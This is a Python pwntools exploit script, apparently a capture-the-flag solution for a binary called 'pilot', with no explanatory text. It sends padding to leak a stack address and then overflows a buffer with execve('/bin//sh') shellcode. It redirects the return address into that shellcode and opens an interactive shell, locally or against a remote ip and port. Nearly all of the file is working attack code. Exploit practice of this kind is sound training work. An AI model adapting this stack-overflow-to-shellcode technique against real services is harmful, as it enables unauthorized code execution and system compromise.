#!/usr/bin/env python3
from pwn import *
import sys
exe = ELF("../handouts/pilot")
context.binary = exe
context.arch='amd64'
context.log_level='error'

def get_connection():
   
    if len(sys.argv) == 1 : r=process([exe.path]) 

    elif len(sys.argv) == 2 and sys.argv[1].lower() == 'gdb':
        return gdb.debug([exe.path],gdbscript=gs)
        
    elif len(sys.argv) == 4 and sys.argv[1].lower() == 'remote':
        try:
            ip = sys.argv[2]
            port = int(sys.argv[3])
            r = remote(ip, port)

        except ValueError:
            print("Error: Port must be a number")
            exit(1)
        except Exception :
            print("Error connecting to remote:")
            exit(1)
    else:
        print("Usage:")
        print("  Local:  python solve.py local")
        print("  Remote: python solve.py remote <ip> <port>")
        exit(1)
    return r

def main():
    r = get_connection()
    
    # Helper functions
    sla = lambda x, y: r.sendlineafter(x, y)
    sa  = lambda x, y: r.sendafter(x, y)
    sl  = lambda x:    r.sendline(x)
    s   = lambda x:    r.send(x)
    rvu = lambda x:    r.recvuntil(x)
    rv  = lambda x:    r.recv(x)
    rvl = lambda:      r.recvline()
    li  = lambda x:    log.info(x)
    lc  = lambda x:    log.critical(x)
    rvlc= lambda x :   r.recvline_contains(x)



    code = '''
	xor    rsi,rsi
	push   rsi
	movabs rdi,0x68732f2f6e69622f
	push   rdi
	push   rsp
	pop    rdi
	push   0x3b
	pop    rax
	cdq
	syscall

	'''
	
    shellcode=asm(code)
    success("SHC LENGTH: {len(shellcode)}")
    
    payload = b'W'*14
    payload += cyclic(192-len(payload))

    
    s(payload)
    rvu(b'bta')

   
    addr = u64(r.recv(6, timeout=0.5).ljust(8, b'\x00'))
    lc(f"leaked stack_addr : {hex(addr)}")

    buff = addr - 0x98
    lc(f"our buff_addr : {hex(buff)}")
    input("\n\nwaiting, Press Enter to contine... ")
    payload2= flat(
        shellcode.ljust(216-8,b'\x90'),
        exe.bss(),
        buff
        )

    sl(payload2)


    r.interactive()

if __name__ == "__main__":
    main()
